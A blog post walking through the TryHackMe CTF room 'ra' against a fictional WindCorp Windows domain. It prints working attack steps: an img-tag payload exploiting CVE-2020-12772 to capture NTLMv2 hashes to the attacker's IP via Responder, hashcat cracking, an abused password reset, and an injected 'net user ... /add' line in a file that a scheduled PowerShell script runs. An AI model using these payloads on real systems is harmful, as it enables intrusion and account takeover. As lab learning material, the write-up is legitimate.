---
title: "tryhackme: ra"
date: 2021-11-10T16:37:38-05:00
draft: false
type: "post"
---

as i've been studying and preparing for my next big certification, the eCPPT (certified professional penetration tester), i had to remind myself to try and keep my skills sharp. since the course material for the eCPPT goes deeply into the fundamentals of topics like assembly, social engineering, etc., i've had to take time away from it to keep practicing all that i've learned so far. "ra" happened to be the most challenging room i've done until now, but i'm sure there are more to come, that take even more skills into account.

the story with the room is that there's a mega corporation called WindCorp, and they like to brag about the fact that they're "unhackable". in this story, we're a hacker trying to make them eat their words, and we'll be exploiting a windows machine that we've spotted.


as usual, we get a target IP address: 10.10.75.59

and again, we'll start off with an nmap scan (and save the results):

```
nmap -sC -sV -Pn -oN openports.txt 10.10.75.79
# Nmap 7.91 scan initiated Wed Oct 27 14:05:11 2021 as: nmap -sC -sV -Pn -oN openports.txt 10.10.75.59
Nmap scan report for windcorp.thm (10.10.75.59)
Host is up (0.15s latency).
Not shown: 978 filtered ports
PORT     STATE SERVICE             VERSION
53/tcp   open  domain              Simple DNS Plus
80/tcp   open  http                Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Windcorp.
88/tcp   open  kerberos-sec        Microsoft Windows Kerberos (server time: 2021-10-27 18:06:06Z)
135/tcp  open  msrpc               Microsoft Windows RPC
139/tcp  open  netbios-ssn         Microsoft Windows netbios-ssn
389/tcp  open  ldap                Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)
443/tcp  open  ssl/http            Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|   Negotiate
|_  NTLM
| http-ntlm-info: 
|   Target_Name: WINDCORP
|   NetBIOS_Domain_Name: WINDCORP
|   NetBIOS_Computer_Name: FIRE
|   DNS_Domain_Name: windcorp.thm
|   DNS_Computer_Name: Fire.windcorp.thm
|   DNS_Tree_Name: windcorp.thm
|_  Product_Version: 10.0.17763
|_http-title: Site doesn't have a title.
| ssl-cert: Subject: commonName=Windows Admin Center
| Subject Alternative Name: DNS:WIN-2FAA40QQ70B
| Not valid before: 2020-04-30T14:41:03
|_Not valid after:  2020-06-30T14:41:02
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http          Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?
2179/tcp open  vmrdp?
3268/tcp open  ldap                Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)
3269/tcp open  globalcatLDAPssl?
3389/tcp open  ms-wbt-server       Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: WINDCORP
|   NetBIOS_Domain_Name: WINDCORP
|   NetBIOS_Computer_Name: FIRE
|   DNS_Domain_Name: windcorp.thm
|   DNS_Computer_Name: Fire.windcorp.thm
|   DNS_Tree_Name: windcorp.thm
|   Product_Version: 10.0.17763
|_  System_Time: 2021-10-27T18:06:51+00:00
| ssl-cert: Subject: commonName=Fire.windcorp.thm
| Not valid before: 2021-10-26T17:59:00
|_Not valid after:  2022-04-27T17:59:00
5222/tcp open  jabber              Ignite Realtime Openfire Jabber server 3.10.0 or later
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     stream_id: 6w7aj2dxwk
|     unknown: 
| 
|     errors: 
|       invalid-namespace
|       (timeout)
|     capabilities: 
| 
|     auth_mechanisms: 
| 
|     compression_methods: 
| 
|     xmpp: 
|       version: 1.0
|_    features: 
5269/tcp open  xmpp                Wildfire XMPP Client
| xmpp-info: 
|   Respects server name
|   STARTTLS Failed
|   info: 
|     stream_id: 79ay7u58wh
|     unknown: 
| 
|     errors: 
|       host-unknown
|       (timeout)
|     capabilities: 
| 
|     auth_mechanisms: 
| 
|     compression_methods: 
| 
|     xmpp: 
|       version: 1.0
|_    features: 
7070/tcp open  http                Jetty 9.4.18.v20190429
|_http-title: Openfire HTTP Binding Service
7443/tcp open  ssl/http            Jetty 9.4.18.v20190429
|_http-title: Openfire HTTP Binding Service
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm
| Not valid before: 2020-05-01T08:39:00
|_Not valid after:  2025-04-30T08:39:00
7777/tcp open  socks5              (No authentication; connection failed)
| socks-auth-info: 
|_  No authentication
9090/tcp open  zeus-admin?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Wed, 27 Oct 2021 18:06:06 GMT
|     Last-Modified: Fri, 31 Jan 2020 17:54:10 GMT
|     Content-Type: text/html
|     Accept-Ranges: bytes
|     Content-Length: 115
|     <html>
|     <head><title></title>
|     <meta http-equiv="refresh" content="0;URL=index.jsp">
|     </head>
|     <body>
|     </body>
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Wed, 27 Oct 2021 18:06:14 GMT
|     Allow: GET,HEAD,POST,OPTIONS
|   JavaRMI, drda, ibm-db2-das, informix: 
|     HTTP/1.1 400 Illegal character CNTL=0x0
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x0</pre>
|   SqueezeCenter_CLI: 
|     HTTP/1.1 400 No URI
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 49
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: No URI</pre>
|   WMSRequest: 
|     HTTP/1.1 400 Illegal character CNTL=0x1
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|_    <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x1</pre>
9091/tcp open  ssl/xmltec-xmlmail?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP: 
|     HTTP/1.1 400 Illegal character CNTL=0x0
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x0</pre>
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Wed, 27 Oct 2021 18:06:32 GMT
|     Last-Modified: Fri, 31 Jan 2020 17:54:10 GMT
|     Content-Type: text/html
|     Accept-Ranges: bytes
|     Content-Length: 115
|     <html>
|     <head><title></title>
|     <meta http-equiv="refresh" content="0;URL=index.jsp">
|     </head>
|     <body>
|     </body>
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Wed, 27 Oct 2021 18:06:33 GMT
|     Allow: GET,HEAD,POST,OPTIONS
|   Help: 
|     HTTP/1.1 400 No URI
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 49
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: No URI</pre>
|   RPCCheck: 
|     HTTP/1.1 400 Illegal character OTEXT=0x80
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 71
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character OTEXT=0x80</pre>
|   RTSPRequest: 
|     HTTP/1.1 400 Unknown Version
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 58
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Unknown Version</pre>
|   SSLSessionReq: 
|     HTTP/1.1 400 Illegal character CNTL=0x16
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 70
|     Connection: close
|_    <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x16</pre>
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm
| Not valid before: 2020-05-01T08:39:00
|_Not valid after:  2025-04-30T08:39:00
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port9090-TCP:V=7.91%I=7%D=10/27%Time=6179950F%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,11D,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Wed,\x2027\x20Oct\x20
SF:2021\x2018:06:06\x20GMT\r\nLast-Modified:\x20Fri,\x2031\x20Jan\x202020\
SF:x2017:54:10\x20GMT\r\nContent-Type:\x20text/html\r\nAccept-Ranges:\x20b
SF:ytes\r\nContent-Length:\x20115\r\n\r\n<html>\n<head><title></title>\n<m
SF:eta\x20http-equiv=\"refresh\"\x20content=\"0;URL=index\.jsp\">\n</head>
SF:\n<body>\n</body>\n</html>\n\n")%r(JavaRMI,C3,"HTTP/1\.1\x20400\x20Ille
SF:gal\x20character\x20CNTL=0x0\r\nContent-Type:\x20text/html;charset=iso-
SF:8859-1\r\nContent-Length:\x2069\r\nConnection:\x20close\r\n\r\n<h1>Bad\
SF:x20Message\x20400</h1><pre>reason:\x20Illegal\x20character\x20CNTL=0x0<
SF:/pre>")%r(WMSRequest,C3,"HTTP/1\.1\x20400\x20Illegal\x20character\x20CN
SF:TL=0x1\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nContent-Leng
SF:th:\x2069\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\x20400</h1>
SF:<pre>reason:\x20Illegal\x20character\x20CNTL=0x1</pre>")%r(ibm-db2-das,
SF:C3,"HTTP/1\.1\x20400\x20Illegal\x20character\x20CNTL=0x0\r\nContent-Typ
SF:e:\x20text/html;charset=iso-8859-1\r\nContent-Length:\x2069\r\nConnecti
SF:on:\x20close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Illeg
SF:al\x20character\x20CNTL=0x0</pre>")%r(SqueezeCenter_CLI,9B,"HTTP/1\.1\x
SF:20400\x20No\x20URI\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\n
SF:Content-Length:\x2049\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message
SF:\x20400</h1><pre>reason:\x20No\x20URI</pre>")%r(informix,C3,"HTTP/1\.1\
SF:x20400\x20Illegal\x20character\x20CNTL=0x0\r\nContent-Type:\x20text/htm
SF:l;charset=iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20close\r
SF:\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Illegal\x20characte
SF:r\x20CNTL=0x0</pre>")%r(drda,C3,"HTTP/1\.1\x20400\x20Illegal\x20charact
SF:er\x20CNTL=0x0\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nCont
SF:ent-Length:\x2069\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\x20
SF:400</h1><pre>reason:\x20Illegal\x20character\x20CNTL=0x0</pre>")%r(HTTP
SF:Options,56,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Wed,\x2027\x20Oct\x20202
SF:1\x2018:06:14\x20GMT\r\nAllow:\x20GET,HEAD,POST,OPTIONS\r\n\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port9091-TCP:V=7.91%T=SSL%I=7%D=10/27%Time=61799529%P=x86_64-pc-linux-g
SF:nu%r(GetRequest,11D,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Wed,\x2027\x20O
SF:ct\x202021\x2018:06:32\x20GMT\r\nLast-Modified:\x20Fri,\x2031\x20Jan\x2
SF:02020\x2017:54:10\x20GMT\r\nContent-Type:\x20text/html\r\nAccept-Ranges
SF::\x20bytes\r\nContent-Length:\x20115\r\n\r\n<html>\n<head><title></titl
SF:e>\n<meta\x20http-equiv=\"refresh\"\x20content=\"0;URL=index\.jsp\">\n<
SF:/head>\n<body>\n</body>\n</html>\n\n")%r(HTTPOptions,56,"HTTP/1\.1\x202
SF:00\x20OK\r\nDate:\x20Wed,\x2027\x20Oct\x202021\x2018:06:33\x20GMT\r\nAl
SF:low:\x20GET,HEAD,POST,OPTIONS\r\n\r\n")%r(RTSPRequest,AD,"HTTP/1\.1\x20
SF:400\x20Unknown\x20Version\r\nContent-Type:\x20text/html;charset=iso-885
SF:9-1\r\nContent-Length:\x2058\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20
SF:Message\x20400</h1><pre>reason:\x20Unknown\x20Version</pre>")%r(RPCChec
SF:k,C7,"HTTP/1\.1\x20400\x20Illegal\x20character\x20OTEXT=0x80\r\nContent
SF:-Type:\x20text/html;charset=iso-8859-1\r\nContent-Length:\x2071\r\nConn
SF:ection:\x20close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20I
SF:llegal\x20character\x20OTEXT=0x80</pre>")%r(DNSVersionBindReqTCP,C3,"HT
SF:TP/1\.1\x20400\x20Illegal\x20character\x20CNTL=0x0\r\nContent-Type:\x20
SF:text/html;charset=iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x2
SF:0close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Illegal\x20
SF:character\x20CNTL=0x0</pre>")%r(DNSStatusRequestTCP,C3,"HTTP/1\.1\x2040
SF:0\x20Illegal\x20character\x20CNTL=0x0\r\nContent-Type:\x20text/html;cha
SF:rset=iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20close\r\n\r\
SF:n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Illegal\x20character\x20
SF:CNTL=0x0</pre>")%r(Help,9B,"HTTP/1\.1\x20400\x20No\x20URI\r\nContent-Ty
SF:pe:\x20text/html;charset=iso-8859-1\r\nContent-Length:\x2049\r\nConnect
SF:ion:\x20close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20No\x
SF:20URI</pre>")%r(SSLSessionReq,C5,"HTTP/1\.1\x20400\x20Illegal\x20charac
SF:ter\x20CNTL=0x16\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nCo
SF:ntent-Length:\x2070\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\x
SF:20400</h1><pre>reason:\x20Illegal\x20character\x20CNTL=0x16</pre>");
Service Info: Host: FIRE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-10-27T18:06:52
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Oct 27 14:09:16 2021 -- 1 IP address (1 host up) scanned in 245.53 seconds
```

well. that's big.

i'll trim the fat:

```
53/tcp   open  domain              Simple DNS Plus
80/tcp   open  http                Microsoft IIS httpd 10.0
88/tcp   open  kerberos-sec        Microsoft Windows Kerberos (server time: 2021-10-27 18:06:06Z)
135/tcp  open  msrpc               Microsoft Windows RPC
139/tcp  open  netbios-ssn         Microsoft Windows netbios-ssn
389/tcp  open  ldap                Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)
443/tcp  open  ssl/http            Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http          Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?
2179/tcp open  vmrdp?
3268/tcp open  ldap                Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)
3269/tcp open  globalcatLDAPssl?
3389/tcp open  ms-wbt-server       Microsoft Terminal Services
5222/tcp open  jabber              Ignite Realtime Openfire Jabber server 3.10.0 or later
5269/tcp open  xmpp                Wildfire XMPP Client
7070/tcp open  http                Jetty 9.4.18.v20190429
7443/tcp open  ssl/http            Jetty 9.4.18.v20190429
7777/tcp open  socks5              (No authentication; connection failed)
9090/tcp open  zeus-admin?
9091/tcp open  ssl/xmltec-xmlmail?
```


we can see a bunch of services running across a variety of ports. the key here is to not be overwhelmed, and start small. some (or a lot) of these services could even just be rabbit holes waiting to be traversed.

i modified the /etc/hosts file and added windcorp.thm (DNS domain name) and fire.windcorp.thm (DNS computer name). 

let's visit http://windcorp.thm.

the search bar on the site doesn't work, but the "reset password" link does.

![reset](/resetpassword.png)

i have no idea how to fill in these fields, so i'm going to continue digging around the site.

scrolling down a bit, and we can see a list of employees:

```
Antonietta Vidal
Britney Palmer
Brittany Cruz
Carla Meyer
Buse Candan
Edeltraut Daub
Edward Lewis
Emile Lavoie
Emile Henry
Emily Anderson
Hemmo Boschma
Isabella Hughes
Isra Saur
Jackson Vasquez
Jaqueline Dittmer
Emily Jensen
Lily Levesque
Kirk Uglas
```

let's save these names to a file (users.txt), then break up the names so we can search the site's source to see if they pop in any form anywhere else.

```
cat users.txt | tr -s ' ' '\n' > userslist.txt
```

the output (userslist.txt) now looks like:

```
Antonietta
Vidal
Britney
Palmer
Brittany
Cruz
Carla
Meyer
Buse
Candan
Edeltraut
Daub
Edward
Lewis
Emile
Lavoie
Emile
Henry
Emily
Anderson
Hemmo
Boschma
Isabella
Hughes
Isra
Saur
Jackson
Vasquez
Jaqueline
Dittmer
Emily
Jensen
Lily
Levesque
Kirk
Uglas
```

now let's feed this list to a ```curl``` command:

```
curl http://windcorp.thm | egrep -i -f userslist.txt
```

![curlingusers](/curlingusers.png)


we can see the names pop up in some email addresses, but towards the end we can see the names pop up in what appear to be some images. the image that caught my eye was **lilyleAndSparky.jpg**. 

![employees](/employees.png)

![employees2](/employees2.png)


could this be the key to resetting the password? we have a username: lilyle (lily levesque) and the name "sparky" (probably her dog's name). one of the security questions was "what is/was your favorite pets name?". let's try it.

![lilylepassword](/lilylepassword.png)


wow, it actually worked. which is good, because if it didn't i would really not know what to do next and would have to rethink my whole attack.

armed with these credentials (lilyle:ChangeMe#1234), let's enumerate the SMB shares and try to log into one of them.

```
smbclient -L 10.10.75.59 -U lilyle
```

enter the password when prompted.

we can also use:

```
smbmap -u lilyle -p ChangeMe#1234 -H windcorp.thm
```

![smbenumeration](/smbenumeration.png)

let's try to login to the "Shared" share.

```
smbclient \\\\10.10.75.59\\Shared -U lilyle --password ChangeMe#1234
```

![smblogin](/smblogin+flag1.png)

we can see there's a flag stored right there, along with installers for an application called "spark". 

let's download both the flag, and the .deb installer.

```
get "Flag 1.txt"
get spark_2_8_3.deb
```

if the installer is too big for your network connection, the connection will timeout. in that case, you can try ```curl```:

```
curl -u "windcorp.thm\lilyle:ChangeMe#1234" smb://windcorp.thm/Shared/spark_2_8_3.deb
```

this didn't work for me either, so i tried to download and install the tarball package (spark_2_8_3.tar.gz). when that also didn't work, i ended up finding an installer on the internet and just downloaded then installed that. the version difference in this case didn't matter, but in a real-life scenario, versions are often very important, and some exploits don't work with later versions of applications.

once you've downloaded spark, try to get some info on the package.

```
dpkg-deb -I spark_2_8_3.deb
```

![sparkinfo](/sparkinfo.png)

it's a "cross-platform real-time collaboration client optimized for business and organizations".

basically, it's an IM client or chat app.


when it's installed, try to use the credentials lilyle:ChangeMe#1234 to log in.

the login fails, because the app wasn't able to verify the certificate. no matter, because we can go into the advanced settings of the app and select the option "accept all certificates" and disable "certificate hostname verification".

now, we can log in. 

we see there's a conference room, but no one is in it. the app looks pretty empty.

![spark_room](/spark_room.png)

![sparkempty](/sparkempty.png)

when dealing with apps like this, it's good practice to start searching vuln databases to see if any exploit exists. a good place to check is https://attackerkb.com/

searching for "spark exploits" leads us to CVE-2020-12772. 

![attackerkb](/attackerkb.png)

in a nutshell, this exploit allows us to send an "image" to a contact, but the SRC attribute of the image will refer our IP address. when the contact clicks this link, their hashes will be sent with the HTTP request. to receive this data, we'll need to run Responder.py.

now we need to select a target. if you remember, the site had a list of technical staff and their status (online/offline). going back to the site, we see that the user "buse" is online. let's target them.

first, run responder:

```
/opt/Responder/Responder.py
```

now, send the following "image" to buse:

```
<img src="http://10.9.6.194/bilal.jpg>
```

wait for buse to click the link...

![responder](/responder.png)

![sparkexploit](/sparkexploit.png)

we receive a hash, in the NTLMv2 format. hopefully, we can crack it with hashcat (and rockyou.txt):

```
hashcat.exe -a 0 -m 5600 "buse::WINDCORP:1122334455667788:96320659CCC8CCD0C23852F82AA669C8:0101000000000000792F24210DCCD701CB9891E68DB963FB000000000200060053004D0042000100160053004D0042002D0054004F004F004C004B00490054000400120073006D0062002E006C006F00630061006C000300280073006500720076006500720032003000300033002E0073006D0062002E006C006F00630061006C000500120073006D0062002E006C006F00630061006C000800300030000000000000000100000000200000B25F9F074A7F2B076C71892C3D7F9B988260CA42BCBEB4E1863C7810B3FF276D0A00100000000000000000000000000000000000090000000000000000000000" C:\rockyou.txt
```

upon a successful crack, we'll get the password ```uzunLM+3131```. great! now we have another set of credentials -- buse:uzunLM+3131


note: i do recommend saving found/cracked credentials in a text file. that way we're not constantly scrolling through terminal trying to find them.

```
echo "buse:uzunLM+3131" > creds.txt
```


now we get to use one of my favourite tools ever: [evil winrm](https://kalilinuxtutorials.com/evil-winrm-hacking-pentesting/). if you don't know, evil winrm is basically the go-to tool, sometimes used by sysadmins but mostly by hackers, to remotely access a windows machine. it's extremely useful in the post-exploitation phase.

```
evil-winrm -u buse -p uzunLM+3131 -i windcorp.thm
```

this will log us in as buse, and upon poking around, you'll locate the 2nd flag. 

what's more interesting though, and which proves to eventually be vital in privilege escalation, is a folder in C:\ that contains a powershell script and its log. 

![busescripts](/busescripts.png)

the code for the checkservers.ps1 script is as follows:

```powershell
# reset the lists of hosts prior to looping
$OutageHosts = $Null
# specify the time you want email notifications resent for hosts that are down
$EmailTimeOut = 30
# specify the time you want to cycle through your host lists.
$SleepTimeOut = 45
# specify the maximum hosts that can be down before the script is aborted
$MaxOutageCount = 10
# specify who gets notified
$notificationto = "brittanycr@windcorp.thm"
# specify where the notifications come from
$notificationfrom = "admin@windcorp.thm"
# specify the SMTP server
$smtpserver = "relay.windcorp.thm"

# start looping here
Do{
$available = $Null
$notavailable = $Null
Write-Host (Get-Date)

# Read the File with the Hosts every cycle, this way to can add/remove hosts
# from the list without touching the script/scheduled task,
# also hash/comment (#) out any hosts that are going for maintenance or are down.
get-content C:\Users\brittanycr\hosts.txt | Where-Object {!($_ -match "#")} |
ForEach-Object {
    $p = "Test-Connection -ComputerName $_ -Count 1 -ea silentlycontinue"
    Invoke-Expression $p
if($p)
    {
     # if the Host is available then just write it to the screen
     write-host "Available host ---> "$_ -BackgroundColor Green -ForegroundColor White
     [Array]$available += $_
    }
else
    {
     # If the host is unavailable, give a warning to screen
     write-host "Unavailable host ------------> "$_ -BackgroundColor Magenta -ForegroundColor White
     $p = Test-Connection -ComputerName $_ -Count 1 -ea silentlycontinue
     if(!($p))
       {
        # If the host is still unavailable for 4 full pings, write error and send email
        write-host "Unavailable host ------------> "$_ -BackgroundColor Red -ForegroundColor White
        [Array]$notavailable += $_

        if ($OutageHosts -ne $Null)
            {
                if (!$OutageHosts.ContainsKey($_))
                {
                 # First time down add to the list and send email
                 Write-Host "$_ Is not in the OutageHosts list, first time down"
                 $OutageHosts.Add($_,(get-date))
                 $Now = Get-date
                 $Body = "$_ has not responded for 5 pings at $Now"
                 Send-MailMessage -Body "$body" -to $notificationto -from $notificationfrom `
                  -Subject "Host $_ is down" -SmtpServer $smtpserver
                }
                else
                {
                    # If the host is in the list do nothing for 1 hour and then remove from the list.
                    Write-Host "$_ Is in the OutageHosts list"
                    if (((Get-Date) - $OutageHosts.Item($_)).TotalMinutes -gt $EmailTimeOut)
                    {$OutageHosts.Remove($_)}
                }
            }
        else
            {
                # First time down create the list and send email
                Write-Host "Adding $_ to OutageHosts."
                $OutageHosts = @{$_=(get-date)}
                $Body = "$_ has not responded for 5 pings at $Now"
                Send-MailMessage -Body "$body" -to $notificationto -from $notificationfrom `
                 -Subject "Host $_ is down" -SmtpServer $smtpserver
            }
       }
    }
}
# Report to screen the details
$log = "Last run: $(Get-Date)"
write-host $log
Set-Content -Path C:\scripts\log.txt -Value $log
Write-Host "Available count:"$available.count
Write-Host "Not available count:"$notavailable.count
Write-Host "Not available hosts:"
$OutageHosts
Write-Host ""
Write-Host "Sleeping $SleepTimeOut seconds"
sleep $SleepTimeOut
if ($OutageHosts.Count -gt $MaxOutageCount)
{
    # If there are more than a certain number of host down in an hour abort the script.
    $Exit = $True
    $body = $OutageHosts | Out-String
    Send-MailMessage -Body "$body" -to $notificationto -from $notificationfrom `
     -Subject "More than $MaxOutageCount Hosts down, monitoring aborted" -SmtpServer $smtpServer
}
}
while ($Exit -ne $True)
```


it looks like this code is checking the status of some hosts every 1 minute, from a file stored at ```C:\Users\brittanycr\hosts.txt```.

when we try to read brittanycr's directories, our access is denied.

![brittanycr](/brittanycr.png)

if we run the command ```whoami /groups``` as buse, we'll see that buse is in the group "account operators".

![whoamigroups](/whoamigroups.png)

account operators can change passwords for other users, which means buse can change the password for brittanycr.

```
net user brittanycr wEiRdP@$$W0rd1234! /domain
```

(i chose this password because it complies with the password policy.)

once the password has been changed, let's try to get that file at ```C:\Users\brittanycr\hosts.txt```. since the checkservers.ps1 script reads from this file without being too annoying about checking what's in it, we're gonna inject a little bit of code into it and get the script to run it. this will be our ticket into getting root access.


getting in:

```
smbclient \\\\windcorp.thm\\Users -U brittanycr --password wEiRdP@$$W0rd1234!
```

navigate to the folder above and download the hosts.txt file, then edit it to add the following bit of code:

```
; net user bilal 'p*s$w0rd123' /add; net localgroup Administrators bilal /add
```

![hosts](/hosts.png)

when the script performs this little maneuver, it will inadvertently create a user "bilal", and add me to the Administrators group heh heh.

we have to replace the previous hosts.txt file with the new one. we can do this using the ```upload``` command in brittanycr's evil winrm instance.

now if we navigate to buse's "scripts" folder, keep checking the log file to see if the script has been successfully run. it might be a bit of a wait, but if you're patient, you'll see the script will have run.


we should now be able to access the network with our new (root) credentials. 

![evilwinrmfail](/evilwinrmfail.png)

hmmm, evil winrm is failing to log me in. maybe we can use another tool?

first, i have to check if my credentials are actually root. to do this, let's use [crackmapexec](https://www.ivoidwarranties.tech/posts/pentesting-tuts/cme/crackmapexec/), a badass tool that quickly assesses the security of large AD networks. if it says we have access, i'll use psexec.py to log in.

```
crackmapexec smb windcorp.thm -u bilal -p 'p*s$w0rd123'

python3 /usr/share/doc/python3-impacket/examples/psexec.py bilal@windcorp.thm
```

![pwned](/pwned.png)

hell yeah, *we're in*.

![rootflag](/rootflag.png)


that was a hell of a ride. from doing a bit of recon on the company's users, sending fake links to IT, getting their hash then password, then injecting our own malicious code into a routine script to get root...i guess WindCorp isn't unhackable after all :)



